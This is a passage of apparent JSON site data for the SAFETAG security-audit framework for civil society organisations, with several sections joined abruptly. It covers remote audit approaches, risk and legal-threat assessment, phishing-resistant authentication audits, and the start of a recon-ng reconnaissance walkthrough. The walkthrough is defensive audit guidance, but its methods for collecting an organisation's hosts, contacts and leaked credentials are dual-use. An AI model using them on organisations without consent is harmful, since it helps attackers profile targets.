responses in between.\n\n  * An introductory video chat is recommended as a starting point, this allows the auditor to introduce themselves, the exercise, and agree on communication rules. This will help in building rapport, and address any concerns participants may have, as well as allow for further testing of communication channel.\n  * The auditor ask participants to fill in a template or survey to collect information needed (See Approach 4 for survey details), this stems directly from the activity, whether it is data assessment, process mapping, threat analysis, or any activity requiring facilitation.\n  * Participants send their input to auditor, either through answering into and online questionnaire, or through any other media agreed on.\n  * Auditor collect the information and arrange them for analysis and discussion.\n  * Another video chat is conducted to discuss responses and expand and validate on information collected through the survey.\n  * Follow up sessions may be arranged with selected groups of staff as needed.\n\n###### Approach 3, multiple small sessions\nSuitable for medium to large groups where it is possible to conduct multiple small video chats. It is recommended for sessions to be arranged to include people from the same organizational level, but different functions/teams/arms/departments of the organization.  This approach scales to larger organizations and helps ensure voices at different levels of the organization are heard.\n\n  * Auditor works with participants via video chat through the full exercise and discussion.\n  * Follow up sessions may be arranged with selected groups of staff as needed.\n\n\n###### Approach 4, hybrid offline/asynchronous\n  * Introductory email/session through local facilitator (may need to provide remote training on the activities).\n  * Collect responses and input through a survey.\n  * Discuss responses and finding via email or voice chat to expand and validate.\n\n**Sample Questions: Data Mapping**\n\n* Where does your organizational email live? Please select all devices where email is stored or accesses:\n  * [ ] Email server / webmail\n  * [ ] Backup server\n  * [ ] Office computers\n  * [ ] Office Laptops\n  * [ ] Office cell phones\n  * [ ] Backup drives\n  * [ ] Personal laptops\n  * [ ] Personal cell phones\n  * [ ] Tablets\n  * [ ] Designated Travel laptops/tablets\n  * [ ] Other? ______\n* Where does the organization share files?\n  * [ ] Email\n  * [ ] Shared drive at office\n  * [ ] Box/Dropbox/OneDrive/etc.\n  * [ ] Custom hosted (owncloud, etc.)\n  * [ ] Google Drive/Docs\n  * [ ] USB drives\n  * [ ] Other? _______\n* What types of files does the organization track and use?\n  * [ ] Financial records\n  * [ ] HR / personal contracts (personal data, including ID and bank info)\n  * [ ] Other personal data (passports, etc.)\n  * [ ] Funding records\n  * [ ] Sensitive / internal program records\n  * [ ] Publications\n  * [ ] Videos\n  * [ ] Project proposals\n"},"base":"section_4.md"}},{"node":{"childMarkdownRemark":{"rawMarkdownBody":"\nThis is a placeholder file, please ignore\n"},"base":"section_5.md"}},{"node":{"childMarkdownRemark":{"rawMarkdownBody":"## Risk Assessment & Analysis\n\nFunctionally, SAFETAG is an information security risk assessment framework. Risk assessment is a systematic approach to identifying and analyzing risks associated with potential hazards to organized human activities. SAFETAG focuses this approach on information security risks. A SAFETAG audit will work to collect the types of information listed in sections below in order to assess the risks an organization faces.\n\n### Risk\n\nRisk is the current assessment of the possibility of harmful events occurring. Risk is assessed by comparing the threats an actor faces with their vulnerabilities, and their capacity to respond to or mitigate emergent threats.\n\nThe SAFETAG evaluation revolves around collecting enough information to identify and assess the various risks an organization and its related actors face so that they can take action strategically.\n\n![The Risk Equation](/img/risk_equation.svg)\n\nSAFETAG breaks the risk analysis down into three parts: Program Analysis, Vulnerability Analysis, and Threat Analysis.\n\n### Program Analysis\n\nProgram analysis identifies the priority objectives of the organization and determine its capacities. This process helps the auditor identify and describe the activities, actors, and capacities of an organization.\n\n#### Activities\n\n**Definition:** The practices and interactions that the organization carries out in order to accomplish their goals. This includes any activity that the organization carries out to accomplish its goals and those that allow the organization to function.\n\n**Example:**  Organizing conferences, publishing press releases, sending out newsletters, legal aid clinics, conducting research, making payments, fund-raising, renewing legal registration status.\n\n* What is the main purpose of the organization?\n* What are the processes the organization takes part in and executes to carry out their work?\n\n#### Actors\n\n**Definition:** The staff, volunteers, partners, beneficiaries, donors, and adversaries associated with the organization.\n\n**Example:** The core organizational staff, the volunteers, maintenance, cleaning, security, or other non-critical staff; the partner organizations; the individuals and groups that the organization provides services to; groups of unorganized individuals who are opposed to organizational aims, governmental and non-governmental high-power agents and organizations that are opposed to the organizations aims.\n\n* What staff does the organization have?\n* Are their volunteers, maintenance, cleaning, security, or other non-critical staff who have access to the office?\n* Who does the organization serve?\n* Does the organization have any partners?\n* Who are the organizations beneficiaries?\n* Who is threatened by the work of the organization?\n* Who has opposed the organization in the past or might do so in the future?\n\n### Vulnerability analysis\n\nUnderstand the organisation’s exposure to threats, points of weakness and the ways in which the organisation may be affected.\n\n#### Vulnerability\n\n**Definition:** An attribute or feature that makes an entity, asset, system, or network susceptible to a given threat.\n\n**Example:** Poorly built or unmaintained hardware, software, or offices as well as missing, ignored, or poor policies or practices around security.\n\n### Threat Analysis\n\nThreat analysis is the process of identifying possible attackers and gathering background information about the capability of those attackers to threaten the organization. The basis of this information is a potential threat's **history** of carrying out specific threats, their **capability** to carry out those threats currently, and proof that the threat has **intent** to leverage resources against the target.\n\n#### Threat\n\n**Definition:** A threat is a possible attack or occurrence that has the potential to harm life, information, operations, the environment, and/or property.\n\n**Example:** Threats can range from *fire,* or *flood,* to *targeted malware,* *physical harassment,* or *phishing attacks.*\n\n##### Threat History\n\n**Definition:** The types of threats the attacker has used historically and and the types of actors which have been targeted by those threats.\n\n**Example:**\n\n* What history of attacks does the threat actor have?\n* What techniques have they used? Have they targeted vulnerabilities that the organization currently has?\n* Have they targeted similar organizations?\n* What is known about the types of threats used by a threat actor to attack similar organizations?\n\n##### Threat Capability\n\n**Definition:** The means that the attacker has to carry out threats against the organization.\n\n**Example:** This includes, but is not limited to technical skill, financial support, number of staff hours, and legal power.\n\n* Does the threat actor have the means to exploit a vulnerability that the organization currently has?\n* Does the threat actor have the means to leverage widespread threats against all similar organizations, or will they have to prioritize their targets?\n\n##### Threat Intent\n\n**Definition:** The level of desire for the attacker to carry out threats against the organization.\n\n**Example:** Intent can be goals or outcomes that the adversary seeks; consequences the adversary seeks to avoid; and how strongly the adversary seeks to achieve those outcomes and/or avoid those consequences.\n\n* Does the threat actor currently have the desire to conduct an attack against this type of organization?\n* Is the organization a priority threat target for the threat actor?\n\n## Agency Building\n\nSAFETAG differs from many risk assessment tools because it aims to build the host's and staff's capacity so that they are able to address the risks that the auditor has identified. SAFETAG is designed to provide in-audit activities and training that increase an organization's agency to seek out and address security challenges within their organization. To do this an auditor must collect information that allows them to identify organizational areas of strength and weakness - for instance staff expertise, financial resources, willingness to learn, and staff time.\n\nA common refrain among auditors, software developers and other specialists in this sector is that digital security is not about technology; it is about people. This is undeniably true, and the SAFETAG modules — despite their more direct fixation on technology — acknowledge this insight by emphasizing the educational and persuasive roles played by your findings report.\n\n#### Capacity\n\n**Definition:** The combination of strengths, attributes and resources available within the organization that can be used to reduce the impact or likelihood of threats.\n\n**Example:** Technical skill, financial support, staff and management time, internal processes, relationships, and legal clout.\n\n#### Barriers\n\n**Definition:** The combination of weaknesses, assumptions, regulations, social or cultural practices, and obligations that get in the way of an organization effectively managing digital security risk.\n\n**Example:** Lack of funding, lack of authority within an organization to mandate practices to their staff, resistance to change, high staff turnover, or digital illiteracy.\n"},"base":"the-safetag-approach-to-risk-assessment-agency-building.md"}}]},"activities":{"edges":[{"node":{"fields":{"slug":"/activities/regional_context_research"},"frontmatter":{"title":"Regional Context Research","summary":"This exercise focuses on research and re-confirmation of regional issues from\ngeneral trends to specific legal restrictions and safety concerns, as well as\ncurrent news and persistent challenges.\n","orgSize":1000,"approaches":["Research"],"position":1,"tools":null,"remoteOptions":["Complete"],"overview":"* Identify any legal risks associated with conducting the audit (Secure\ncommunications and storage, network forensics, device exploitation, digital\nsecurity training.)

Many tools are developed without input from high-risk users in global majority countries, leaving them lacking in usability and functionality considerations important to those populations. Your ability to collect feedback offers a unique opportunity to contribute to building feedback loops between tool teams and those users.\n\nThe [USABLE guidebook](https://usable.tools/guidebook/) is a compilation of activities and resources designed to integrate feedback collection into existing digital security training frameworks, and can equally be used during digital security assessments. The Guidebook provides guidance on collecting feedback from users, engaging developers/tool teams, and how best to document and provide that feedback to provide actionable feedback to developers.\n\nAs a SAFETAG auditor you may find themselves in a good position, several USABLE activities are highlighted here, with pointers to the full activity descriptions in the guidebook","orgSize":100,"approaches":["Interpersonal","Research","Technical"],"position":25,"tools":null,"remoteOptions":["Partial"],"overview":"Collecting and communicating feedback can be useful in two scenarios: (A) identifying usability issues in open-source tools used by the assessed organization, or (B) reporting usability difficulties encountered in open-source tools you yourself used during the assessment.\n\nFor scenario (A), the following steps can be taken:\n\n1. Identify the open-source tool causing pain points for the organization.\n2. Select an appropriate feedback collection activity from the USABLE Guidebook (several suggestions are listed below).\n3. Use an appropriate method to submit feedback to the developers or tool teams, such as GitHub Issues queues or other direct submission methods.\n\nFor scenario (B), a similar procedure can be followed, but feedback can be collected at a time and in a way that works best for you, using methods described in the USABLE Guidebook.","materials_needed":null,"considerations":null,"walk_through":"After identifying open-source tools either used by the organization being assessed, or tools you yourself used during the assessment which had usability issues you would like to ensure gets communicated to their developers, select an activity from the [USABLE Guidebook](https://usable.tools/pdfs/USABLE_UX-Feedback-Collection-Guidebook.pdf) to utilise or inform your feedback collection work.\n\nBelow you will find a selection of sections identified in the [Guidebook](https://usable.tools/pdfs/USABLE_UX-Feedback-Collection-Guidebook.pdf) which may be useful. Full activity walkthroughs as well as additional feedback collection and communication activities you may find useful can be found in the full document.\n\n### Collecting feedback to better understand the user (Part I)\n\n* **User Stories** - gather feedback from users about their experiences and needs. This involves creating a narrative that describes a user's experience with a tool or platform. The narrative should include details about the user's goals, motivations, and frustrations, and will help to identify pain points in a tool or platform experienced by the organization and provide insights into how it can be improved to better meet their needs.\n\n### Collecting tool-specific feedback (Part II)\n\n* The **Pluses vs. Deltas** activity is a feedback exercise that identifies a tool's strengths and weaknesses from a user's perspective. Participants brainstorm and list positive aspects (pluses) and negative aspects (deltas) of the tool, then prioritize them based on importance and potential impact.\n* The **Mark-up a Screenshot** activity helps identify usability issues specific to a tool. It involves taking screenshots of a tool in action, marking them up to highlight issues, and categorizing them based on severity or frequency. Participants can use tools like Skitch, Snagit, or GIMP to annotate the screenshots with text, arrows, boxes, or circles.\n* The **User and Observer** activity involves observing user behavior during a task with a tool and then analyzing their process to identify areas of difficulty. Firs select a task for the user to complete within the tool, then ask them to complete the task while being observed or recorded. The observer should take note of any difficulties or errors the user encounters, as well as any comments or feedback they provide during the task.\n\n### Communicating with Developers and Tool Teams (Part IV)\n\n* **Tips for communicating with developers**: provides quick tips for engaging with open source developers when communicating feedback. It emphasizes the importance of being respectful and establishing a personal connection with the developer. It also advises finding the proper channel to communicate, researching and following any specific feedback guidelines, documenting the steps that led to the issue, offering specific suggestions for improvements, advocating for more secure and user-friendly tools, and following up with the developer.\n* The **Bug Reports** section explains documenting issues encountered during the use of a tool, along with steps to reproduce the issue and any additional information that may be relevant. The report should be submitted to the tool's development team in a clear and concise manner, including screenshots or animated GIFs if necessary to clearly illustrate the issue.\n* **GIFs**: Create animated GIFs to illustrate usability issues. These can be used to communicate issues to developers and tool teams more effectively than written descriptions. Record a short video of the issue and use GIPHY Capture or LICEcap to create an animated GIF. Embed the GIF in feedback reports or submit it directly to developers.\n\n### An Examples of Tool Feedback Collection workflows\n\nAn examples may help illustrate how this activity might occur in the context of a SAFETAG assessment:\n\n> During a SAFETAG assessment for an organization, you discover that they are using VeraCrypt to create encrypted volumes but some users are having difficulty finding those volumes on their computer, while others are accidentally overwriting important files during the volume creation process.\n\nTo better understand the issue, you use the User Stories activity to gather feedback on why VeraCrypt is being used by this group and how the users are searching for the volumes and what difficulties they are experiencing. You also use the Mark-up a Screenshot activity to collect tool-specific feedback on pain points and confusion with the volume creation process. Finally, you create a hand-drawn sketch (see below) to indicate potential solutions to alternative and improved user experience.\n\nAfter compiling the feedback, you communicate with the VeraCrypt development team on the project GitHub page, including the marked-up screenshots, hand-drawn wireframe, while following the tips provided in the USABLE guidebook. You also reach out to a member of the VeraCrypt team through a community referral to let them know about the feedback and offer to have further discussion on the challenges experienced in the documented use case.\n\n![A hand-drawn wireframe indicating an alternative user interface for Volume Creation in VeraCrypt](/img/stuframe.jpeg)","recommendations":null}}},{"node":{"fields":{"slug":"/activities/assessing-legal-threats"},"frontmatter":{"title":"Assessing legal threats","summary":"This activity was built to assist civil society organizations (CSOs) in safeguarding institutional integrity and resilience by preventing legal uncertainty. It is based on organizational guiding questions that help better frame and assess administrative or legal liability directly or indirectly derived from their work. The methodology is based on historical experiences that CSOs have faced, specific assessments for civil society, and judicial precedents from various contexts. Thus, its objective is to contribute to a culture of constant legal evaluation from within the organizations and with legal professionals.","orgSize":1000,"approaches":["Research","Interpersonal"],"position":50,"tools":null,"remoteOptions":["Complete"],"overview":"By nature, the power asymmetries that civil society organizations challenge\nbring reactions that can come in the form of physical, digital, or\ninstitutional threats. Within all those aspects, legal harassment often\nappears, threatening the group’s stability. This activity aims to contribute\nto legal assessments during the whole life-cycle of civil society work, from\nplanning to evaluating its results and, to avoid and mitigate legal threats\nposed by those in power. \n\n\nThe outputs of this activity are:\n\n\n* A diagnosis of existing legal vulnerabilities and threats faced by the organization.\n\n* A map of foreseeable legal risks based on vulnerabilities and potentialities of the organization.\n\n* The establishment of a comprehensive response and timely plan in case of incidents involving legal threats to the organization.\n\n* The development of a collective and internal legal security assessment.\n","materials_needed":null,"considerations":"* Given each country has its legal framework and context, conducting a legal\nassessment in different jurisdictions will require very different workflows\nand as a result, will give very different outcomes. With this in mind, the\nactivity proposes general aspects and questions related to legal security to\nbe explored in light of the specific context present in each\njurisdiction/country.\n\n* Besides the legal framework in each jurisdiction, another factor to consider is the status of the rule of law. For instance, in some countries, regardless of the legitimate nature of CSOs and activism in general, the law is enforced discretionarily to criminalize and persecute these activities. This might result in higher levels of uncertainty but will make visible other aspects of security that should be addressed the same. Conducting more expanded threat assessment exercises would complement and help kickstart this activity.\n\n* For accuracy, this activity requires the assistance from a lawyer expert in the local jurisdiction to advise, especially in the legal landscape, key regulations, state of the rule of law, and enforcement related to the operations of CSOs.\n\n* Keep in mind that the legal field covers a wide range of aspects: criminal law, taxes, labor, etc. So, try to cover as many of them as possible.\n\n* Scenarios including litigation against civil society individuals and organizations also encompass sensitive political contexts, not only in less democratic regimes and dictatorships but also in “established democracies”. Political figures can be put on the spotlight because of civil society investigations, which can trigger a legal reaction of authorities for political reasons. As a result, being prepared for these situations is also part of risk assessments, including those of a legal nature. So, there is no “fault” or irresponsibility if a CSO is being sued because of its work, even though it is important to cultivate organizational awareness.\n\n* The product of this activity, including communications with the legal professional, will contain sensitive information that can put the organization at risk if accessed by adversaries. With this in mind, these outcomes must be sufficiently secured by digital controls (such as encryption, secure passwords, and authentication) and have their access restricted to authorized personnel only. \n\n* Finally, proper legal advising, specific to each case and context, is essential. As a result, although a legal risk assessment culture has to be built within a CSO, seeking advice and legal consultation with a law professional is the basic response and expected institutional reaction when facing a legal threat. Meanwhile, CSOs can better organize themselves to give law professionals the proper informational resources.\n\n* Depending on the kind of work the auditor or the organization usually does, and the level of experience they have from previous experiences with legal threats and strategies, it might be possible that any of them feel the capacity to conduct parts of this activity on their own. In that case, keep in mind that many components of the regulatory framework and/or its enforcement might have changed from previous experiences, so proceed at your own risk. If possible, refer to a professional lawyer with knowledge of the different aspects covered in this activity.\n","walk_through":"1. It is necessary to have an inventory of documentation concerning the\nquestions below, updated and at hand to assist a legal professional.\nDesignating one person or a small team to be responsible for this can make the\nprocedure more structured and part of routine processes.\n\n2. The documentation may include not only the essential bureaucratic material, such as statutory documents but also the initial risk assessments made by the CSO, establishing avoidable and inherent risks to the organization based on the questions below. Conversations and interviews with other partner CSOs might be helpful to give more input to this internal job, making it more complete.\n\n3. Then, the assistance of a legal professional or legal firm will be fundamental. The CSO will be able to comprehensively understand their legal status according to their unique jurisdiction. The duty of the legal professional is to help the organization walk through the country's legal framework, enhancing the risk assessment with legal certainty. If that is the situation, the responsible person or team within the CSO will be responsible for updating the documentation regarding the assessment and be the contact point with the legal professional. Some guiding questions for this stage are:\n\n   1. **Bureaucracy**\n\n      1. Is the organization formally constituted and registered, with the legal requirements in place, such as an updated statute and eventual fees and taxes duly paid?\n      2. About the work conditions within the organization, does the staff have their labor rights fully guaranteed (time-off and respect for weekly working hours, and signed contract, for example)?\n      3. Does the organization have an appointed DPO (Data Protection Officer)? (In case the jurisdiction requires it).\n      4. Are there any extra aspects that might require permits or paid fees according to the local law (like health permits, property taxes, or activity authorizations)?\n   2. **Institutional/organizational**\n\n      1. Does the organization have a legal team? Or does the organization have institutional relationships with legal professionals focused on counseling civil society (before, during, or after a given activity or milestone)?\n      2. Concerning the management of digital material (the whole set of digitized files and servers), could the leak of such material lead to damage to the honor/reputation or the propriety of someone or something (an institution, for example)?\n      3. Does the organization disclose the name and source of its funding? If so, how does it happen (for example, in a specific area of the institutional website or on an annual report)? Is this disclosure necessary, or might it bring issues if done?\n   3. **Socio-political**\n\n      1. In the past year, did your organization experience any of the following: government surveillance, vandalism in its premises, judicial or administrative process or harassment, targeted cyber attacks, disinformation campaigns, or negative media reports?\n      2. According to the criminal law legal framework of the country, does the organization have or once have had some activity (being a one-time action or a project, for example) that could be labeled or typified as a crime?\n      3. Within the national legal framework (covering the Federal Constitution and other laws), does the organization consider the protection of CSOs work coherent and reasonable, such as their freedom of assembly and peaceful manifestation?\n      4. In manifestations and protests, does the organization record its activities (by audio or video), or are usually accompanied by individuals who do that, such as journalists? \n4. After consultation with a legal professional, it is important for all the staff of the CSO to be aware of the rules and guidelines. That can be done through an email memorandum or a personal or virtual meeting, but all the staff must be aligned and aware of the work being done.\n\n5. The natural product of the legal risk assessment may be a **“must-read” document with legal guidelines** for new personnel affiliated with the organization. That will keep the staff updated from the beginning, avoiding “re-work” and actual legal risks.\n\n6. It is ideal to revisit the guidelines at least once a year. This task can be done by the person or team responsible for it, counting on the eventual inputs of others as well, but together with a legal professional. The objective here is to adapt and re-evaluate the risk assessment according to new political and legal landscapes that are in constant change. Making it an organic part of the administrative work is central to the institutional development of the organization and accomplishment of the organization’s mission.   \n\n7. The security procedures to store and manage the information related to the assessment can be revised annually together with the guidelines by the responsible person or team.\n","recommendations":"Some guides, articles, and resources that might be useful for auditors and\norganizations when doing this kind of assessment are:\n\n\n* (LNPD) Legal Network for the Protection of Democracy in Slovenia: <https://pravna-mreza.si/about-us/>\n\n* (International Center for Not-for-Profit Law) Global Trends in NGO Law: Assessment Tools for Measuring Civil Society’s Enabling Environment: <https://www.icnl.org/wp-content/uploads/global-ngo-law_Global-Trends-Assessment-Tools_Vol-5-Iss-1.pdf>\n\n* (International Center for Not-for-Profit Law) Checklist for CSO Laws: [https://www.icnl.org/wp-content/uploads/Transnational_checklisten.pdf?_ga=2.31647671.800968841.1589471556-96597088.1589471556](https://www.icnl.org/wp-content/uploads/Transnational_checklisten.pdf?_ga=2.31647671.800968841.1589471556-96597088.1589471556) \n\n* (European Union Agency for Fundamental Rights) Europe's civil society: still under pressure: <https://fra.europa.eu/en/publication/2022/civic-space-2022-update> \n\n* (European Center for Not-for-Profit Law) Monitoring Matrix and Toolkit on Enabling Environment for Civil Society Development: <https://ecnl.org/publications/monitoring-matrix-enabling-environment-and-toolkit> \n\n* (United Nations Development Programme) A User’s Guide to Civil Society Assessment: <https://www.nzaia.org.nz/uploads/1/2/3/3/12339018/2010_undp_a-users-guide-to-civil-society-assessments_en.pdf>\n"}}},{"node":{"fields":{"slug":"/activities/assessment_plan"},"frontmatter":{"title":"Assessment Plan","summary":"This component allows an auditor and host to come to an understanding of the\nlevel of access that an auditor will have, what is off limits, and the process\nfor modifying the scope of the audit when new information arises.\n[^PETS_legal_considerations]^,^[^PETS_separate_permissions] This component\nconsists of a process where the auditor collaboratively creates an assessment\nplan with key members of the organization.\n\nA core tenet of SAFETAG is building agency in organizations to improve their digital security.

Traditionally, anti-phishing efforts have focused on teaching staff how to recognize and report suspicious emails. While such a strategy should still play a big part in staff security trainings, vigilance alone isn't enough; even cybersecurity professionals have fallen for phishing scams. As such, it's important that the organization also develops a tech toolkit which can mitigate the eventuality of a staff member being successfully phished.\n\n###### Auditing online service usage for phishing-resistant authentication configuration\n\nPractically every major online service now supports two-factor authentication, which protects against password theft/leaks. Still, most forms of two-factor authentication remain vulnerable to a phishing attack in which an adversary captures a username, password, and two-factor code, and uses them to log in on the real webpage before the two-factor code expires. While sophisticated, such an attack is increasingly common.\n\nOn the other hand, authentication using physical security keys (used in U2F or FIDO2 mode) and passkeys are designed to be resistant to even sophisticated phishing attacks. They are cryptographically tied to the website on which they were registered; it's impossible for a fake webpage to capture the input from a physical security key or passkey, and use it to log in to the real webpage.\n\nTo check whether organizations are utilizing strong authentication options, audit the configuration of their online accounts:\n\n1. If not already done, create an asset list of all work-related services and platform which the organization uses. Some of these may be centrally managed, while others may be individual accounts which staff have signed up for, or even important private accounts (for example, the private email of a high-profile executive director.   \n2. Look at platform documentation (or Settings sections) to identify which ones support phishing-resistant authentication methods such as passkeys and physical security keys in U2F or FIDO2 mode. At worst, some platforms may not even support 2FA.  \n3. Do either a complete review or a sampling of accounts and platforms to identify how authentication is configured. For services which are centrally managed by the organization, review the domain settings for controls which apply to all users, such as enforcing 2FA, enabling passwordless login, and enabling or requiring physical security keys.  \n4. While conducting review, check for important configurations such as password reset/recovery and emergency reset mechanisms like backup emails and phone numbers. In some cases, it may be important to verify that the organization even owns/has control over key online accounts, for instance in cases where previous staff or consultants set up accounts. \n\nThis activity is effective to pair with password leak lookups. Use services such as [haveibeenpwned.com](http://haveibeenpwned.com), [Firefox Monitor](https://monitor.mozilla.org/), [Google Password Checkup](https://passwords.google.com/), and [Dehashed](https://dehashed.com/) in collaboration with staff to check their personal and organizational emails for leaks. The presence of password leaks reinforces the need both for traditional 2FA and strong authentication methods.\n\nFindings for the above can be presented in your report. Where organizations have not yet begun to use strong authentication methods, include recommendations to onboard them to passkeys and physical security keys when possible. \n\n###### Auditing Usage of Password Managers\n\nPassword managers (now also called credential managers) are a key security tool, and the auditor should research how and if they are used within an organization. Organizations where all staff works full time and uses work-issued devices might rely on a work-issued password manager. Organizations which rely on part-time or volunteer staff might also allow staff to use their own. Having a single work password manager is preferable, especially when it comes to sharing credentials within the organizations (several people might, for example, need access to the same general account).\n\nFollow these steps to review an organization's use of password managers:\n\n* Are they not using password managers at all? An absence of these from users may point to dangerous password practices such as password reuse, weak passwords, and physically written-down passwords.  \n* Research the password manager or managers used within the organization. Do they come from a reliable firm? Have they been independently audited? Have there been any security incidents involving the password manager?  \n* Explore whether there are work-related credentials which have been saved in places other than password managers (this could include notebooks, post-its, and others)  \n* Verify if staff are using the password manager to generate secure passwords. If they do not, consider investigating if they use strong practices to set reasonably strong and unique passphrases or if they engage in the creation of weak passwords and reuse password across services.  \n* Ensure that log-in details to key services (organizational email, social media, code hosting services, and others) are only saved in the password manager and nowhere else  \n* Make sure that everybody within the organization has their password manager set to auto-fill logins on webpages. This is not just a matter of convenience; the password manager will match the URL it will autofill with the URL saved in its database. If those do not match, it will typically refuse to autofill. This is an excellent phishing protection, as it stops the password manager from filling in the URL on malicious and phishing sites\n* Explore how the password manager fits into the process of managing shared accounts. In many organizations, there are accounts managed by many people (an frequent example is social media), and depending on how these accounts are configured, their security level might less than ideal. For instance, without password managers, it is usual to configure the shared accounts with insecure passwords (so they are easier to share among teams) and without two-factor authentication. To cover this scenario, cloud-based password managers might include sharing capabilities making it easier to configure the account with a strong password and some form of two-factor authentication. If the password manager the organization uses doesn't support sharing credentials, there might still be other workarounds, but what is sure is that shared accounts should be considered in our assessment process.\n\nShare results and recommendations based on this review.\n\n###### Review 3rd party apps and SSO to further reduce attack surface\n\nSome online attackers might also abuse OAuth grants (3rd party applications), in which external services can access or modify resources such as your organization's emails, documents, or calendars. In legitimate cases, this can be a useful service, allowing for additional functionalities. Still, these permissions are one door through which an attacker or untrusted service can gain access to internal resources. Furthermore, many staff may grant resource access and forget that they had done so, leading to an accumulation of permissions over time. When working with the organization's admin:\n\n* Check the admin panel and review what OAuth permissions, if any, the organization's users have given to external services  \n* Individual users are also able to check which 3rd party apps have been granted permission to access their account data. If not possible to get an overview across an organization with an administrator, instead work with a sampling of users to review their individual accounts from the platform Settings page.  \n* Investigate whether it is possible to restrict OAuth permissions organization-wide, so that they only apply to a small group of trusted or allowlisted services. Note that some programs, like Google’s [Advanced Protection Program](https://landing.google.com/intl/en_in/advancedprotection/), will limit OAuth grants to a trusted allowlist.\n\nMany online services now support single sign-on (SSO). It allows you to sign in to many different services using a single account, typically one used for email or social media. Many organizations will use their primary email provider as their SSO provider. SSO differs slightly from OAuth grants: the former only uses a service as an authentication layer, whereas the latter allows the service to share data with others. SSO is often a great idea from a security perspective, as it only requires administrators to audit and enforce strong log-in security norms (such as phishing-resistant two-factor authentication) for one account, rather than several. It's worth to:\n\n* Check all of the services the organization uses, and see which ones support SSO  \n* Recommend that the organization implements SSO, if they have not already  \n* Ensure that users must follow strict security standards, such as unique long passwords and a phishing-resistant form of two-factor authentication when logging on to the 'primary' service, which then grants access to other services through SSO\n\n###### Assess internal education, communication, and policies\n\nAttackers continue to adapt and refine their techniques, including when it comes to phishing. Defensive measures also change rapidly, with manufacturers building new tools and workflows that could mitigate standard or OAuth phishing. It’s important that people within the organization understand both risks and potential attacks, and potential mitigation. Assess internal education, communication of guidelines/threats, and policies through interviews, surveys, and document review:\n\n* Research how managers and others responsible for security see phishing. Recommend that the organization treats phishing mitigation as a key priority, as a significant part of cyberattacks start with phishing  \n* Explore whether the organization has prepared any training materials on phishing. Look into whether those materials only teach staff how to recognize phishing messages, or also demonstrate technologies such as password manager autofill and phishing-resistant two-factor authentication. Recommend that trainings focus on the latter.  \n* Recommend that the organization implements policies which enforce phishing-resistant two-factor authentication. Those could include requiring everybody to use password manager autofill and phishing-resistant authentication  \n* Check if there is a simple way in which people within the organization can flag up or report suspicious emails and text messages to others within the organization  \n* If the organization uses physical security keys or passkeys, explore how those are managed. Write down the policies that exist, for example whether people are given physical security keys during onboarding, if passkeys are registered on personal or physical devices, etc.  \n* Ensure that the organization has a tested workflow for verifying and restoring access for users whose physical security keys or passkeys have been lost or damaged","recommendations":"Passkeys can be used as a second factor alongside passwords, or they can be used for so-called passwordless login. More and more services are moving towards the latter. Passwordless login contains its own challenges, including making sure that passkeys are stored and managed safely, ensuring that passkeys are secured with strong passwords or biometrics, and building a workflow for quickly revoking passkeys which have been lost or stolen. When working with an organization’s security admins, it’s worth to:\n\n* Explore how different organizations and services are adopting passwordless logins, and what experiences users have with them  \n* Discuss the advantages and possible disadvantages of passwordless logins\n\nConsider if advanced protection programs, such as those offered by [Google](https://landing.google.com/intl/en_us/advancedprotection/), [Microsoft](https://accountguard.microsoft.com/), [Proton](https://proton.me/support/proton-sentinel), or [Meta](https://www.facebook.com/help/1052552578831700/) are appropriate for the organization. \n\nIf budget allows it (or if pro-bono or suitable open source solutions are possible), consider recommending organizations move towards centrally managed business or enterprise account platforms which allow setting of security policies across the organization.\n"}}},{"node":{"fields":{"slug":"/activities/automated_recon"},"frontmatter":{"title":"Automated Reconnaisance","summary":"This component allows the auditor to quickly identify publicly available\nresources (such as websites, extranets, email servers, but also social media\ninformation) connected to the organization and remotely gather information\nabout those resources.\n\nWhile much of SAFETAG focuses on digital security challenges within and around\nthe office, remote attacks on the organization's website, extranets, and\nunintended information available from \"open sources\" all pose real threats and\ndeserve significant attention.

Both tools are best used in addition to critical thinking and\nmanual exploration, and require \"seed\" inputs to get started and careful\ncuration to remove false leads.\n\n___\n\n###### Variant: Recon-ng\n\n**What is recon-ng?**\n\nrecon-ng is an interactive command-line application written in python which is\nused to carry out reconnaissance using various open source intelligence\nresources. It offers a library of modules to carry out various searches using\nexisting knowledge such as a website domain, an IP, an email address, a name,\nor a geographic location. Some modules require usage of a service API which\nyou will need to obtain yourself (some of these are free with usage\nlimitations while others must be paid for). Usage of the modules will populate\ndynamic database tables with information of interest such as personnel\ncontacts, usernames, emails, technical information like hosts, IPs, and ports,\nand password hashes or plaintexts.\n\n**Installing recon-ng**\n\nFollow installation instructions from [Recon-ng Getting Started\nInstructions](https://github.com/lanmaster53/recon-ng/wiki/Getting-Started#installation).\nNote that recon-ng is already included in Kali Linux and Parrot.\n\n**Using recon-ng**\nBelow is a walkthrough on using recon-ng v5, but there is also a good introductory recon-ng V5 video series at [Recon-ng v5 series](https://www.youtube.com/playlist?list=PLBf0hzazHTGOg9taK90uFjdcb8UgGfRKZ)\n**Interface Basics**\n\nRun recon-ng from the command line:\n\n```\n# recon-ng\n```\n\nBy pressing the tab key twice you can use auto-completion to see the available\noptions. This is a good way to familiarize yourself with the commands and\nnavigation. On a new installation, pressing tab twice will display:\n\n```\n[recon-ng][default] |\nback         db           help         keys         modules      pdb         \nshell        snapshots    workspaces   exit         index        marketplace\noptions      script       show         spool\n```\n\nThese are the first level of commands\n\nAutocomplete (pressing tab) works even inside commands:\n\n```\n[recon-ng][default] > show\nbanner           credentials      hosts            locations       \noptions          schema\ncompanies        dashboard        keys             modules         \nports            vulnerabilities\ncontacts         domains          leaks            netblocks       \npushpins         workspaces\n```\n\n\n**Adding recon modules**\n\nrecon-ng v5 does not come with any modules pre-installed but contains a\nmarketplace from which you can search and install individual modules.\n\nTyping ```marketplace search``` will list all modules in the marketplace. Note\nthat modules have a specific name format which helps the user understand the\nflow of data inside the tool. Remember that recon-ng organises information\ninto a number of database tables such as domains, hosts, contacts, leaks.\nModules use the syntax ```<methodology step>/<input table>-<output\ntable>/<module>```.  The inputs are the first part of each module, and the\noutputs are the second part. The module name itself is the tool used to\nprocess the data.  So, recon/domains-hosts/brute-hosts takes domain names\n(websitename.org) as an input, and outputs hostnames\n(extranet.websitename.org, etc.).  If you provide the name of the specific\nmodule, recon-ng can figure it out (though tab completion doesn't help) -- for\nexample, ``` marketplace info threatminer``` works just as well as\n```marketplace info recon/domains-hosts/threatminer```\n\nTyping ```marketplace search``` will display all modules in the marketplace.\nYou can also search for a specific word or input/output table such as\n```marketplace search 